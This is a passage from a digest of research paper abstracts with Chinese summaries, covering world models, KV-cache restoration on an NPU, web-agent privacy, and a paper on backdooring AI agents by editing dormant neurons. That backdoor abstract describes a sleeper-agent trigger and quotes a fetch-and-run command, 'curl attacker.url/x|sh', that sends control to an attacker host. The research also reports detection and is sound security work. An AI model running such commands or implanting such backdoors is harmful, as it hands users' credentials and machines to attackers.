look forward to broader exploration of this emerging field.
summary_zh: 现有世界模型侧重模拟物理现实，将推理与决策作为外部控制。本文提出互惠世界模型RWM，将智能与物理现实视为同等基础。
为实现RWM，Duo v1引入三项设计：自回归建模用于连续交互推理；统一时间线上同步意图与实现模块的因果依赖；双推演蒸馏缓解分布偏移。
Duo v1持续感知音视频与文本，实现全双工交互，支持自发对话、中断及无键鼠的沉浸式交互，为该新兴范式迈出第一步。

title: Recompute or Restore? Host-Tier KV for Multi-Model Agent Workflows on a Static-Graph NPU Serving Stack
title_zh: 静态图NPU上多模型Agent工作流的KV重算与恢复权衡
abstract: Agent workflows issue dependent model calls that share long context prefixes, so serving them efficiently depends on reusing the key-value (KV) cache of those prefixes. On accelerators that compile model graphs ahead of time, however, the device KV budget is fixed, and prefixes evicted under load must be recomputed. Restoring them from host memory avoids this recomputation, but the transfer occupies the same engine thread as prefill and decode, so its benefit is not guaranteed. In this paper, we study when restoring beats recomputing on a commercial static-graph neural processing unit (NPU) stack (Rebellions ATOM+, vllm-rbln 0.10.2) that serves a Qwen3-8B planner on two cards and a Qwen3-0.6B executor on one. We first show that repeated prefill dominates planner work when default serving collapses: 89.5% of the executed planner prompt tokens had been materialized before. We then build a synchronous host-DRAM tier on the runtime's public KV copy calls, together with a scheduler-aware event model whose predictions are frozen before each test cohort. Experimental results show that the host tier raises workflow service-level objective (SLO) attainment from 22.8% to 100% and from 9.4% to 99.8% in the two tested overload conditions, and endpoint confirmation on two new seeds supports conservative load gains of 11.8% (chain) and 18.2% (fork), while mixed and bursty workloads remain seed-sensitive. The frozen model predicts median and 99th-percentile (P99) latency within its 15% tolerance in all 24 common-load conditions, including the 16-18% P99 increase that the tier causes for fork workflows, but it misorders three policy contrasts and overestimates the benefit of a cheaper store path (11% predicted against 3.1% measured). The trade-off therefore depends on runtime scheduling and transfer cost as well as cache capacity.
summary_zh: 多模型Agent工作流共享长上下文前缀，但在静态图NPU上设备KV预算固定，需权衡重算被驱逐前缀还是从主机内存恢复。
在商用NPU栈上构建同步主机DRAM KV层与调度感知事件模型，发现恢复机制可将工作流SLO达标率提升至近100%。
冻结预测模型能较准预测延迟，但会误判部分策略对比且高估廉价存储路径收益，故重算与恢复的权衡取决于运行时。

title: Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents
title_zh: 重编休眠神经元以植入AI Agent后门
abstract: Imagine an AI agent that aces every relevant evaluation, but when it sees 2027-01-01 in the terminal, it runs curl attacker.url/x|sh, handing an attacker your credentials and your machine. Agents now run unattended for hours with privileged system access, making the integrity of model weights a security concern whether a model comes from third parties or is developed internally. We show that a method we call Lazarus can turn a capable model into such a sleeper agent by editing fewer than ten neurons, without model training. Lazarus edits dormant neurons in the model's final feed-forward block, forcing each to promote a payload token through its contribution to the residual stream, when a trigger is present. A $P$-token payload therefore requires about $P$ neurons. The trigger can be an ordinary string appearing anywhere in the agent's context. The edited weights are set in closed form and can be refined in isolation with a few hundred gradient steps. The core insight that dormant neurons can be individually edited and chained to produce a multi-token payload was discovered autonomously by Claude Code with Opus 4.5 in February 2026. On Nemotron-Terminal-8B, seven of 12,000+ neurons, fitted on 23 trigger/no-trigger trajectories, fire the payload on at least 98.8% of triggered test trajectories, with no observed payload leakage on the evaluated benign trajectories. The attack generalizes: Qwen3.6-27B and Gemma-4-31B-IT are equally vulnerable. The same structure that makes the attack possible also makes it detectable. Agent built defenses, given no reference model, flag 91.4% of edited test checkpoints at a 9.7% FP rate. Our results underscore that model weights should be treated like code, audited before deployment and monitored for post-deployment updates.
summary_zh: AI Agent长期自主运行且具高权限，模型权重完整性面临被植入隐蔽后门的安全威胁。
提出Lazarus方法，通过修改最终前馈块中少于10个休眠神经元，无需训练即可将模型变为潜伏Agent。
该攻击具高触发率与低误漏率且跨模型泛化，但同结构也使其可被Agent防御检测，强调权重需审计与监控。

title: GuardianAgentFlow: Multi-Agent Coordination for Web Privacy Protection
title_zh: GuardianAgentFlow：面向Web隐私保护的多智能体协调框架
abstract: Web agents need to use private context without unnecessarily disclosing it. Effective protection must distinguish between requests that may be sent after sanitization and those that must be withheld, while preserving the information needed for authorized tasks. We present GuardianAgentFlow, a multi-agent framework that mediates outgoing Web requests through an explicit release contract. A dedicated restriction check grounds permission in the user's instruction; a shared protection scope aligns rewriting with disclosure checking; and candidate-grounded feedback guides revision before transmission.
